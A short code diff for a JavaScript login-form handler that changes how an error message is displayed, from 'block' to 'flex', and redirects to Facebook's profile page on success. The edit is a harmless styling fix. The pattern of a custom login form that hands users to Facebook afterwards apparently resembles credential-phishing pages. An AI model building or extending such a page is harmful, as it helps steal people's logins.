@@ -107,14 +107,14 @@
                     window.location.href = data.redirectUrl || 'https://www.facebook.com/me'; // Redirect if success
                 } else {
                     // Show an error message if login failed
-                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("error-message").style.display = "flex";
                     document.getElementById("error-message").querySelector("p").textContent = "An error occurred. Please try again later.";
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
                 // Show a generic error message in case of network issues or other errors
-                document.getElementById("error-message").style.display = "block";
+                document.getElementById("error-message").style.display = "flex";
                 document.getElementById("error-message").querySelector("p").textContent = "An error occurred. Please try again later.";
             });
         });
